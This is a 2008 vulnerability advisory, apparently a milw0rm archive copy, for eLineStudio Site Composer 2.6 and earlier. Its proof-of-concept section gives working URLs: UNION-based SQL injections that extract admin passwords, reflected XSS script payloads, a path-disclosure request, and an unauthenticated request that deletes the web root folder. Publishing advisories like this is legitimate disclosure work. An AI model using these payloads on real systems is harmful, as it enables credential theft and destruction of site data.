<html><head><title>eLineStudio Site Composer (ESC) <= 2.6 Multiple Vulnerabilities </title></head><pre>########################## www.BugReport.ir #######################################
#
#        AmnPardaz Security Research Team
#
# Title: eLineStudio Site Composer (ESC) &lt;=2.6 Multiple Vulnerabilities
# Vendor: www.elinestudio.com
# Vulnerable Version: 2.6 and prior versions
# Exploit: Available
# Impact: High
# Fix: N/A
# Original Advisory: www.bugreport.ir/?/45
###################################################################################

####################
1. Description:
####################
    eLineStudio Site Composer is a 100% browser-based database-driven content management system that helps companies to better manage, update &amp; share web content. eLineStudio Site Composer provides affordable &amp; flexible licensing for end users &amp; web developers.
####################
2. Vulnerabilities:
####################
    2.1. Injection Flaws, Cross Site Scripting (XSS). SQL Injection in &quot;/ansFAQ.asp&quot; in &quot;id&quot; parameter. Reflected XSS attack in &quot;/ansFAQ.asp&quot; in &quot;topic&quot; and &quot;button&quot; parameters.
        2.1.1. Exploit:
                        Check the exploit/POC section.
    2.2. Injection Flaws. SQL Injection in &quot;preview.asp&quot; in &quot;template_id&quot; parameter.
        2.2.1. Exploit:
                        Check the exploit/POC section.
    2.3. Information Leakage. Database path disclosure in &quot;/cms/include/trigger.asp&quot; and/or &quot;/cms/include/common2.asp&quot;.
        2.3.1. Exploit:
                        Check the exploit/POC section.
    2.4. Failure to Restrict URL Access. Attacker can delete any folder on the server by &quot;/cms/assetmanager/folderdel_.asp&quot;.
        2.4.1. Exploit:
                        Check the exploit/POC section.
    2.5. Failure to Restrict URL Access. Attacker can create folder on the server by &quot;/cms/assetmanager/foldernew.asp&quot;.
        2.5.1. Exploit:
                        Check the exploit/POC section.
    2.6. Cross Site Scripting (XSS). Reflected XSS attack in &quot;login.asp&quot; in &quot;id&quot; and &quot;txtEmail&quot; parameters.
        2.6.1. Exploit:
                        Check the exploit/POC section.
####################
3. Exploits/POCs:
####################
    Original Exploit URL: http://bugreport.ir/index.php?/45/exploit
    3.1. SQL Injection in &quot;/ansFAQ.asp&quot; in &quot;id&quot; parameter. Reflected XSS attack in &quot;/ansFAQ.asp&quot; in &quot;topic&quot; and &quot;button&quot; parameters.
        -------------
        Find Admin's password:
            http://[URL]/ansFAQ.asp?id=-2 union select email,password from [user] where email like '%25admin%25'
        XSS attacks:
            http://[URL]/ansFAQ.asp?id=1&amp;topic=&lt;/title&gt;&lt;script&gt;alert('sdl BugReport.IR XSS')&lt;/script&gt;
            http://[URL]/ansFAQ.asp?id=1&amp;button=&quot;&gt;&lt;script&gt;alert('sdl BugReport.IR XSS')&lt;/script&gt;
        -------------
    3.2. SQL Injection in &quot;preview.asp&quot; in &quot;template_id&quot; parameter.
        -------------
        Find Admin's password:
            http://[URL]/preview.asp?template_id=-1 union select 1,'[%25menu%25]' as date_created,email%2b'&lt;br&gt;'%2bpassword,user.*,user.*,1,2,3,4,5 from [user] where email like '%25admin%25'
        -------------
    3.3. Database path disclosure in &quot;/cms/include/trigger.asp&quot; and/or &quot;/cms/include/common2.asp&quot;.
        -------------
        http://[URL]/cms/include/trigger.asp
        http://[URL]/cms/include/common2.asp?id=1
        -------------
    3.4. Attacker can delete any folder on the server by &quot;/cms/assetmanager/folderdel_.asp&quot;.
        -------------
        http://[URL]/cms/assetmanager/folderdel_.asp?inpCurrFolder=C:\InetPub\wwwroot\
        -------------
    3.5. Attacker can create folder on the server by &quot;/cms/assetmanager/foldernew.asp&quot;.
        -------------
        http://[URL]/cms/assetmanager/foldernew.asp?inpCurrFolder=c:\inetpub\wwwroot\&amp;inpNewFolderName=test2008
        -------------
    3.6. Reflected XSS attack in &quot;login.asp&quot; in &quot;id&quot; and &quot;txtEmail&quot; parameters.
        -------------
        http://[URL]/login.asp?id=1&quot;&gt;&lt;script&gt;alert('sdl BugReport.ir XSS')&lt;/script&gt;
        http://[URL]/login.asp?txtEmail=1&quot;&gt;&lt;script&gt;alert('sdl BugReport.ir XSS')&lt;/script&gt;
        -------------
####################
4. Solution:
####################
    Edit the source code to ensure that inputs are properly sanitized (for 2.1, 2.2, 2.6). Rename the mentioned files in section 2.3, 2.4, 2.5, and wait for vendor patch.
####################
5. Credit:
####################
AmnPardaz Security Research &amp; Penetration Testing Group
Contact: admin[4t}bugreport{d0t]ir
WwW.BugReport.ir
WwW.AmnPardaz.com

# milw0rm.com [2008-06-19]</pre></html>